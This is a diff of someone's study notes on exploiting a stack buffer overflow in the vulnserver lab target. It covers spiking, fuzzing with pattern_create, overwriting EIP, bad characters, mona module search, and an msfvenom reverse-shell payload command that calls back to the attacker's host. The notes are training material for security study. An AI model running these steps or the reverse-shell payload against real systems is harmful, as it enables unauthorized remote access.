@@ -1,16 +1,21 @@
-==============================================================
-buffer overflow
-==============================================================
+=== BUFFER OVERFLOW ===
 
 All about overwriting EIP.
-==============================================================
-Commands
-==============================================================
+
+--- Procedure ---
+1. Spiking (normal or trun)
+2. Fuzzing
+3. Overwriting the EIP
+4. Finding Bad Characters
+5. Finding the right module
+6. Generating shell code and getting root
+
+Refer to cybersec/scripts/buffer_overflow
+
+--- Commands ---
 Prepare immunity debugger as well
 
-==============================================================
-Spiking
-==============================================================
+--- Spiking ---
 Refer to relevant .spk script in scripts
 
 generic_send_tcp 192.168.1.100 9999 <script>.spk 0 0
@@ -21,18 +26,16 @@ vuln server crashes
 refer to registers on immunity debugger on vulnserver
 
 Look at EAX, EAP, EIP. All are now replaced with A's.
-==============================================================
-fuzzing
-==============================================================
+
+--- Fuzzing ---
 after sending first script for fuzzing:
 
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 
 fuzzing -
+Finding implementation bugs using malformed/semi-malformed data injection in an automated fashion
 
-==============================================================
-overwriting the EIP
-==============================================================
+--- Overwriting the EIP ---
 Trying to determine how many bytes it takes to overflow the EIP
 
 perform next command after sending through the other script:
@@ -41,10 +44,7 @@ perform next command after sending through the other script:
 
 after overwriting the EIP, you now control it as you have manipulated the EIP to display 42424242
 
-=================================================================
-finding bad characters
-=================================================================
-
+--- Finding bad characters ---
 refer to relevant script
 
 Refer back to immunity debugger
@@ -61,10 +61,7 @@ make sure to look for things out of the ordinary in shellcode
 
 write down the numbers
 
-==============================================================
-finding the right module
-==============================================================
-
+--- Finding the right module ---
 Looking for a dll inside a program without protection. Tool: Monamodules corelan via github.
 
 Place in immunity debugger pycommands folder (windows)
@@ -108,9 +105,7 @@ Overflow buffer except ESP
 
 Now we have full manipulation of EIP and it displays the pointer from earlier (displayed in python script of topic)
 
-=========================================================================
-Generating shellcode and getting root
-=========================================================================
+--- Generating shellcode and getting root ---
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip of atking machine> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 
 Wait for shell code, then copy and paste. Disregard semi-colon at the end.
